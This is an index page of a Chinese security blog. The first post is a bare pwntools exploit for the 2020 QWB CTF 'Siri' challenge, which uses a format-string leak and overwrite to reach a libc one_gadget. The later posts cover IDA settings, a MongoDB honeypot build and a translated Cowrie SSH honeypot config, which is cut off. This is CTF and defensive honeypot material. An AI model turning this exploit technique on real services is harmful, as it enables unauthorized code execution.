<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.8.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="My blog">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="My blog">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="My blog">

<link rel="canonical" href="http://yoursite.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>My blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">My blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/07/CTF/pwn/Siri/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xxx">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/04/07/CTF/pwn/Siri/" class="post-title-link" itemprop="url">qwb2020-Siri</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-04-07 23:13:21" itemprop="dateCreated datePublished" datetime="2020-04-07T23:13:21+08:00">2020-04-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-02-17 18:36:34" itemprop="dateModified" datetime="2021-02-17T18:36:34+08:00">2021-02-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="format-string"><a href="#format-string" class="headerlink" title="format string"></a>format string</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p = process('./main')</span></span><br><span class="line">p = remote(<span class="string">'10.10.31.156'</span>,<span class="number">10003</span>)</span><br><span class="line"><span class="comment">#p = process(["/ctf/work/adworld/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so","./Siri"],env=&#123;"LD_PRELOAD":"/ctf/work/adworld/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc.so.6"&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">'/ctf/work/adworld/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc.so.6'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt; '</span>,<span class="string">'Hey Siri!'</span>)</span><br><span class="line">offset = <span class="number">14</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt; '</span>,<span class="string">'Remind me to  '</span> + <span class="string">'BBBBAAAAAAAAStack:%46$pLIBC:%83$pPROC:%47$pCanary:%45$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Stack:'</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">288</span></span><br><span class="line">log.info(<span class="string">'Stack:\t'</span> + hex(stack))</span><br><span class="line">p.recvuntil(<span class="string">'LIBC:'</span>)</span><br><span class="line">libc_base = int(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">240</span> - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">log.info(<span class="string">'LIBC:\t'</span> + hex(libc_base))</span><br><span class="line">p.recvuntil(<span class="string">'PROC:'</span>)</span><br><span class="line">proc_base = int(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x144C</span></span><br><span class="line">log.info(<span class="string">'Proc:\t'</span> + hex(proc_base))</span><br><span class="line">p.recvuntil(<span class="string">'Canary:'</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'Canary:\t'</span> + hex(canary))</span><br><span class="line">pop_rdi_ret = proc_base  + <span class="number">0x0152B</span></span><br><span class="line">leave_ret = proc_base + <span class="number">0x12E2</span></span><br><span class="line"><span class="comment">#rce = libc_base + 0x10A45C</span></span><br><span class="line">rce = libc_base + +<span class="number">0x4527a</span></span><br><span class="line">open_sys = libc_base + libc.sym[<span class="string">'open'</span>]</span><br><span class="line">read_sys = libc_base + libc.sym[<span class="string">'read'</span>]</span><br><span class="line">puts = libc_base + libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt; '</span>,<span class="string">'Hey Siri!'</span>)</span><br><span class="line">off_1 = (((stack + <span class="number">0x50</span>)&amp;<span class="number">0xFFFF</span>))</span><br><span class="line">off_2 = (leave_ret&amp;<span class="number">0xFFFF</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x5555555552A2')</span></span><br><span class="line"><span class="keyword">if</span> off_1 &gt; off_2:</span><br><span class="line">    payload  = <span class="string">'Remind me to '</span> + <span class="string">'%'</span> + str((off_2 - <span class="number">27</span>)) + <span class="string">'c%55$hn'</span> + <span class="string">'%'</span> + str((off_1 - off_2)) + <span class="string">'c%56$hn'</span></span><br><span class="line">    payload  = payload.ljust(<span class="number">0x38</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(stack + <span class="number">8</span>) + p64(stack)</span><br><span class="line">    payload += p64(rce)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload  = <span class="string">'Remind me to '</span> + <span class="string">'%'</span> + str((off_1 - <span class="number">27</span>)) + <span class="string">'c%55$hn'</span> + <span class="string">'%'</span> + str((off_2 - off_1)) + <span class="string">'c%56$hn'</span></span><br><span class="line">    payload  = payload.ljust(<span class="number">0x38</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(stack) + p64(stack + <span class="number">8</span>)</span><br><span class="line">    payload += p64(rce)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt; '</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/ida基本配置/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xxx">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/05/01/ida基本配置/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-05-01 22:03:32 / 修改时间：22:11:41" itemprop="dateCreated datePublished" datetime="2019-05-01T22:03:32+08:00">2019-05-01</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>显示汇编注释<br>options —&gt;  Disassembly —&gt;  Auto comments</p>
<p>ida和od联调时，设置ida基地址<br>Edit —&gt;  Segment —– Rebase  Program<br>显示中文<br>Alt + A : 设置—- “ASCII String style ”—–“set  default encoding”。</p>
<p>如果想要在Hex -rays的伪代码中显示出字符串，可以设置：“Edit”—plugins —- Option—-Analysis — “Print only constant string literals”</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/企业安全建设/蜜罐/mongo蜜罐/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xxx">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/05/01/企业安全建设/蜜罐/mongo蜜罐/" class="post-title-link" itemprop="url">mongodb蜜罐- mongodb-honeyproxy</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-05-01 20:17:01" itemprop="dateCreated datePublished" datetime="2019-05-01T20:17:01+08:00">2019-05-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-02-15 20:04:07" itemprop="dateModified" datetime="2021-02-15T20:04:07+08:00">2021-02-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/企业安全建设/" itemprop="url" rel="index"><span itemprop="name">企业安全建设</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/企业安全建设/蜜罐/" itemprop="url" rel="index"><span itemprop="name">蜜罐</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nodejs-legacy</span><br><span class="line">https://github.com/Plazmaz/MongoDB-HoneyProxy</span><br><span class="line"></span><br><span class="line">npm config <span class="built_in">set</span> strict-ssl <span class="literal">false</span></span><br><span class="line">npm config <span class="built_in">set</span> registry=<span class="string">"http://registry.npmjs.org/"</span></span><br><span class="line">npm install nan</span><br><span class="line">npm install gyp</span><br><span class="line">npm install ref</span><br><span class="line">npm install</span><br><span class="line">npm cache clean -f</span><br><span class="line"></span><br><span class="line">mkdir /data/db</span><br><span class="line">mongoimport --db users --collection contacts --file   primer-dataset.json</span><br></pre></td></tr></table></figure>
<p>mongo<br>use users<br>db.contacts.find()<br>确保mongod可以正常运行<br>mongod –dbpath=/data/db –fork –logpath=/data/db/log –port 27016</p>
<p>node index.js</p>
<p>docker build –tag=”changeme” .<br>docker run -d -p 27017:27017 –name=”changeme” changeme<br>docker exec -it changeme bash</p>
<p>docker-compose up –no-recreate</p>
<p>制作自己的mongodb蜜罐<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu:18.04</span><br><span class="line">docker run -it ubuntu:18.04 /bin/bash</span><br><span class="line">sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list</span><br><span class="line">apt-get clean</span><br><span class="line">apt-get update -y</span><br><span class="line">apt-get upgrade -y</span><br><span class="line">apt-get dist-upgrade -y</span><br><span class="line">apt-get install mongodb mongodb-server nodejs vim net-tools wget -y</span><br><span class="line">mkdir -p /data/db</span><br><span class="line">apt-get install nodejs npm gcc g++ git -y</span><br><span class="line">git clone https://github.com/Plazmaz/MongoDB-HoneyProxy.git</span><br><span class="line">cd MongoDB-HoneyProxy</span><br><span class="line">wget https://raw.githubusercontent.com/mongodb/docs-assets/primer-dataset/primer-dataset.json</span><br><span class="line"></span><br><span class="line">npm config set strict-ssl false</span><br><span class="line">npm config set registry=&quot;http://registry.npmjs.org/&quot;</span><br><span class="line">npm install nan gyp ref</span><br><span class="line">npm install</span><br><span class="line"># vi mongodb.cnf</span><br><span class="line">dbpath=/data/db/</span><br><span class="line">logpath=/data/db/mongo.log</span><br><span class="line">logappend=true</span><br><span class="line">fork=true</span><br><span class="line">port=27016</span><br><span class="line">mongod -f mongodb.cnf</span><br><span class="line">mongoimport --db users --collection contacts --port 27016 --file   primer-dataset.json </span><br><span class="line">exit</span><br><span class="line">docker container ls -a</span><br><span class="line">docker commit 容器ID ubuntu:mongodb-honeypot</span><br><span class="line">编辑Dockerfile和docker-compose.yml</span><br></pre></td></tr></table></figure></p>
<p>docker-compose up –no-recreate<br>docker run -it ubuntu:mongodb-honeypot /bin/bash</p>
<p>mongodb –port 27016</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/23/企业安全建设/蜜罐/ssh蜜罐-cowrie/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xxx">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/23/企业安全建设/蜜罐/ssh蜜罐-cowrie/" class="post-title-link" itemprop="url">ssh蜜罐-cowrie</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-04-23 14:17:29" itemprop="dateCreated datePublished" datetime="2019-04-23T14:17:29+08:00">2019-04-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-02-15 20:03:19" itemprop="dateModified" datetime="2021-02-15T20:03:19+08:00">2021-02-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/企业安全建设/" itemprop="url" rel="index"><span itemprop="name">企业安全建设</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/企业安全建设/蜜罐/" itemprop="url" rel="index"><span itemprop="name">蜜罐</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><a href="https://github.com/cowrie/cowrie" title="ssh服务蜜罐" target="_blank" rel="noopener">ssh服务蜜罐cowrie</a></p>
<p><a href="https://owrie.readthedocs.io/en/latest/index.html" title="cowrie" target="_blank" rel="noopener">cowrie 文档</a></p>
<p>docker pull cowrie/cowrie</p>
<p>配置docker-compose.yml<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">'3'</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  cowrie:</span><br><span class="line">    restart: always</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: Dockerfile</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">"22:2222"</span></span><br><span class="line">      - <span class="string">"23:2223"</span></span><br><span class="line">    image: <span class="string">"cowrie/cowrie"</span></span><br><span class="line">    volumes:</span><br><span class="line">      - /data/cowrie/cowrie-git/etc:/cowrie/cowrie-git/etc</span><br><span class="line">      - /data/cowrie/cowrie-git/var:/cowrie/cowrie-git/var</span><br></pre></td></tr></table></figure></p>
<p><strong>重点</strong><a href="https://github.com/cowrie/cowrie/blob/master/etc/cowrie.cfg.dist" title="配置文件" target="_blank" rel="noopener">cowrie.cfg配置文件</a></p>
<details><br><summary>cowrie.cfg配置翻译</summary><br><br># ============================================================================<br># 通用选项<br># ============================================================================<br>[honeypot]<br><br><br># 实例名<br>sensor_name=myhostname<br><br># shell上显示的虚假主机名<br>hostname = svr04<br><br><br># 存储log的位置<br>log_path = var/log/cowrie<br><br><br># 存储下载文件的位置<br>download_path = ${honeypot:state_path}/downloads<br><br><br># 静态文件位置<br>share_path = share/cowrie<br><br><br># 动态文件位置<br>state_path = var/lib/cowrie<br><br><br># 配置文件位置<br>etc_path = etc<br><br><br># 这仅用于’cat’之类的命令来显示文件的内容.<br># 在这里添加文件不足以让它们出现在蜜罐中， 实际的虚拟文件系统保存在filesysem_file中<br># 虚拟文件内容的位置<br>contents_path = honeyfs<br><br><br>#<br>#<br># 该命令必须放在此目录下，并带有正确的路径，例如<br># txtcmds/usr/bin/vi<br># 在内部运行时，文件的内容将是命令的输出<br># 另外，该文件必须存在于虚拟文件系统中<br>#<br># 存放虚拟命令的位置<br>txtcmds_path = txtcmds<br><br><br>#<br># 限制现在文件的最大大小<br>#download_limit_size = 10485760<br><br># tty用来在UML中记录完整终端交互记录（暂时不懂怎么用）<br>ttylog = true<br><br># 默认ttylog日志位置<br>ttylog_path = ${honeypot:state_path}/tty<br><br># 交互超时时间<br>interactive_timeout = 180<br><br># 设置认证失败的超时时间<br>authentication_timeout = 120<br><br># cowrie的后端用户, 选项: proxy or shell<br># 若用于代理，仅具有request_exec功能（使用真实的代理环境还是虚拟shell环境？）<br>backend = shell<br><br># 选择时区<br>timezone = UTC<br><br><br># ============================================================================<br># 网络配置<br># ============================================================================<br><br><br># 当服务器向外访问时使用的ip<br>#<br># (default: not specified)<br>#out_addr = 0.0.0.0<br><br><br># 连入过机器的虚拟IP<br># 这不影响log，只影响w、last等命令<br>#<br># If not specified, the actual IP address is displayed instead (default<br># behaviour).<br>#<br># (default: not specified)<br>#fake_addr = 192.168.66.254<br><br><br># 限制可以从因特网连入的地址.如果空则会自己分配<br>#<br>#internet_facing_ip = 9.9.9.9<br><br><br># 记录蜜罐的公网地址 (如果监听127.0.0.1是有用的)<br># IP address is obtained by querying <a href="http://myip.threatstream.com" target="_blank" rel="noopener">http://myip.threatstream.com</a><br>#report_public_ip = true<br><br><br><br># ============================================================================<br># Authentication Specific Options<br># ============================================================================<br><br><br># 实现checklogin（）方法的类<br>#<br># 必须是cowrie/core/auth.py中定义的<br># 默认是UserDB（密码数据库）<br># 可以使用AuthRandom（使一个用户在尝试随机次数后可以登录）<br>auth_class = UserDB<br><br># 当使用AuthRandom时可以设置<br>#  auth_class_parameters: <min try>, <max try>, <maxcache><br>#  比如2，5，10等于允许2-5次尝试后，缓存10种组合<br>#auth_class = AuthRandom<br>#auth_class_parameters = 2, 5, 10<br><br><br># 没有认证<br># ‘auth_none’可以使用户不需要认证即可登录<br>#auth_none_enabled = false<br><br># 配置键盘交互式登录(不懂)<br>auth_keyboard_interactive_enabled = false<br><br><br># ============================================================================<br># 历史SSH特定选项<br># ============================================================================<br><br># 记录源端口 (可以针对端口转发的情况)<br>#reported_ssh_port = 22<br><br><br><br># ============================================================================<br># SHELL选项<br># ============================================================================<br><br>[shell]<br><br># 包含虚拟文件系统的Python pickle格式的文件<br>#这包括Cowrie文件系统的文件名，路径和权限，但不包括文件内容。 这是由真实模板linux安装的bin / createfs实用程序创建的。<br>filesystem = ${honeypot:share_path}/fs.pickle<br><br><br># ps命令输出<br>#<br># (default: share/cowrie/cmdoutput.json)<br>processes = share/cowrie/cmdoutput.json<br><br><br># 虚拟操作系统框架<br><br>arch = linux-x64-lsb<br><br><br><br># uname -a返回的值<br>kernel_version = 3.2.0-4-amd64<br>kernel_build_string = #1 SMP Debian 3.2.68-1+deb7u1<br>hardware_platform = x86_64<br>operating_system = GNU/Linux<br><br># ssh -v 返回的值<br>ssh_version = OpenSSH_7.9p1, OpenSSL 1.1.1a  20 Nov 2018<br><br><br># ============================================================================<br># SSH 特殊选项<br># ============================================================================<br>[ssh]<br><br># 允许ssh<br>enabled = true<br><br><br># 公私钥<br>rsa_public_key = ${honeypot:state_path}/ssh_host_rsa_key.pub<br>rsa_private_key = ${honeypot:state_path}/ssh_host_rsa_key<br>dsa_public_key = ${honeypot:state_path}/ssh_host_dsa_key.pub<br>dsa_private_key = ${honeypot:state_path}/ssh_host_dsa_key<br><br><br># 返回到SSH版本<br>version = SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2<br><br># 加密算法<br>ciphers = aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc<br><br><br># mac算法<br>macs = hmac-sha2-512,hmac-sha2-384,hmac-sha2-56,hmac-sha1,hmac-md5<br><br><br># 压缩方法<br>compression = <a href="mailto:zlib@openssh.com" target="_blank" rel="noopener">zlib@openssh.com</a>,zlib,none<br><br><br># 指定可以连入的ip<br># 默认0.0.0.0允许any<br>#listen_addr = 0.0.0.0<br># (use :: for listen to all IPv6 and IPv4 addresses)<br>#listen_addr = ::<br><br><br># 监听端口<br>#listen_port = 2222<br><br><br># 允许SFTP<br>sftp_enabled = true<br><br><br># 允许ssh转发<br>forwarding = true<br><br><br># 转发请求到其他蜜罐<br>forward_redirect = false<br><br><br># 配置转发地址<br><br># Redirect http/https<br># forward_redirect_80 = 127.0.0.1:8000<br># forward_redirect_443 = 127.0.0.1:8443<br><br># To record SMTP traffic, install an SMTP honeypoint.<br># (e.g <a href="https://github.com/awhitehatter/mailoney)" target="_blank" rel="noopener">https://github.com/awhitehatter/mailoney)</a>, run<br># python mailoney.py -s yahoo.com -t schizo_open_relay -p 12525<br># forward_redirect_25 = 127.0.0.1:12525<br># forward_redirect_587 = 127.0.0.1:12525<br><br><br># This enables tunneling forwarding requests to another address<br># Useful for forwarding protocols to a proxy like Squid<br># (default: false)<br>forward_tunnel = false<br><br><br># Configure where to tunnel the data to.<br># forward_tunnel_<portnumber> = <tunnel ip>:<tunnel port><br><br># Tunnel http/https<br># forward_tunnel_80 = 127.0.0.1:3128<br># forward_tunnel_443 = 127.0.0.1:3128<br><br><br># ============================================================================<br># telnet 选项<br># ============================================================================<br>[telnet]<br><br># 支持telnet<br>enabled = false<br><br># 指定可连入IP<br>#<br># (default: 0.0.0.0) = any IPv4 address<br>#listen_addr = 0.0.0.0<br># (use :: for listen to all IPv6 and IPv4 addresses)<br>#listen_addr = ::<br><br><br># 指定监听端口<br>#<br># (default: 2223)<br>#listen_port = 2223<br><br><br># Endpoint to listen on for incoming Telnet connections.<br># See <a href="https://twistedmatrix.com/documents/current/core/howto/endpoints.html#servers" target="_blank" rel="noopener">https://twistedmatrix.com/documents/current/core/howto/endpoints.html#servers</a><br># (default: listen_endpoints = tcp:2223:interface=0.0.0.0)<br># (use systemd: endpoint for systemd activation)<br># listen_endpoints = systemd:domain=INET:index=0<br># For IPv4 and IPv6: listen_endpoints = tcp6:2223:interface=\:\: tcp:2223:interface=0.0.0.0<br># Listening on multiple endpoints is supported with a single space seperator<br># e.g “listen_endpoints = tcp:2223:interface=0.0.0.0 tcp:2323:interface=0.0.0.0” will result listening both on ports 2223 and 2323<br># use authbind for port numbers under 1024<br><br>listen_endpoints = tcp:2223:interface=0.0.0.0<br><br><br># Source Port to report in logs (useful if you use iptables to forward ports to Cowrie)<br>#reported_port = 23<br><br><br><br># ============================================================================<br># Database logging Specific Options<br># ============================================================================<br><br># XMPP Logging<br># Log to an xmpp server.<br>#<br>#[database_xmpp]<br>#server = sensors.carnivore.it<br>#user = <a href="mailto:anonymous@sensors.carnivore.it" target="_blank" 